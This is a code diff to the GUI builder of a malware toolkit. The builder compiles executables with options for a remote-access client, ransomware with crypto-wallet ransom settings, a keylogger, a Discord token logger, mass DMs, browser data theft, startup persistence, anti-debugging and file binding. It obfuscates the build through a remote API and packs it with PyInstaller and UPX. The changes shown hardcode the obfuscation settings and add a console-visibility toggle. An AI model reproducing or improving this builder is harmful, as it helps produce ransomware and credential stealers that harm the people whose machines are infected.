@@ -276,8 +276,7 @@ class App(customtkinter.CTk):
             "File Icon": customtkinter.CTkButton,
             "Anti Debug": customtkinter.CTkCheckBox,
             "Run As Admin": customtkinter.CTkCheckBox,
-            "Base (2 - 55000)": customtkinter.CTkEntry,
-            "Obfuscation (1 - 5)": customtkinter.CTkEntry
+            "Show Console (Debug)": customtkinter.CTkCheckBox
         }
         
         misc_frame = Frame(master=main_frame, widgets=misc_widgets, intonly=[6, 7], default=[6, 7], row=0, column=1, columnspan=3, rowspan=16, pady=0, padx=20, activation_widget=None)
@@ -346,19 +345,13 @@ class App(customtkinter.CTk):
         icon = misc_config['File Icon'].get()
         debug = misc_config['Anti Debug'].get()
         admin = misc_config['Run As Admin'].get()
+        windowed = not misc_config['Show Console (Debug)'].get()
 
         binder_files = binder_widgets['Add File'].filenames
 
-        try:
-            self.base = int(misc_config['Base (2 - 55000)'].get())
-            self.recursion = int(misc_config['Obfuscation (1 - 5)'].get())
-        except ValueError:
-            self.base = 55000
-            self.recursion = 2
-
         self.response_label.configure(text='Compiling To Exe...')
 
-        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files])
+        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, windowed, binder_files])
 
     @staticmethod
     def banner():
@@ -374,7 +367,7 @@ class App(customtkinter.CTk):
         """))
 
     def compile(self, config):
-        rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files = config
+        rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, windowed, binder_files = config
         key = {
             "SERVER_CLIENT": rat_client,
             "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
@@ -398,14 +391,10 @@ class App(customtkinter.CTk):
             "ADMIN": admin
         }
 
-        if not (self.base and self.recursion):
-            self.response_label.configure(text='Error: You must set the Base and Obfuscation level')
-            return
-
         request = requests.get('https://septicx.pythonanywhere.com/api/obfuscate', json={
             "options": {
-                "base": self.base,
-                "recursion": self.recursion,
+                "base": 55000,
+                "recursion": 2,
                 "bytes": True
             },
             "config": key,
@@ -498,8 +487,8 @@ class App(customtkinter.CTk):
             '--hidden-import', 'discord_webhook', 
             '--hidden-import', 'websocket', 
             '--hidden-import', 'discord',
-            '--hidden-import', 'pyaudio'
-            '--hidden-import','cv2',
+            '--hidden-import', 'pyaudio',
+            '--hidden-import','cv2'
         ] if rat_client else []
 
         browser_imports = [
@@ -518,7 +507,7 @@ class App(customtkinter.CTk):
 
         imports = default_imports + keylogger_imports + ransomware_imports + server_imports + browser_imports + discord_imports
 
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--clean'] + imports + ['--icon' if icon else '', icon if icon else '', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{cryptodome_path};Cryptodome', '--add-data', f'{bit_path};bit', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed' if windowed else '', '--onefile', '--clean'] + imports + ['--icon' if icon else '', icon if icon else '', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{cryptodome_path};Cryptodome', '--add-data', f'{bit_path};bit', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
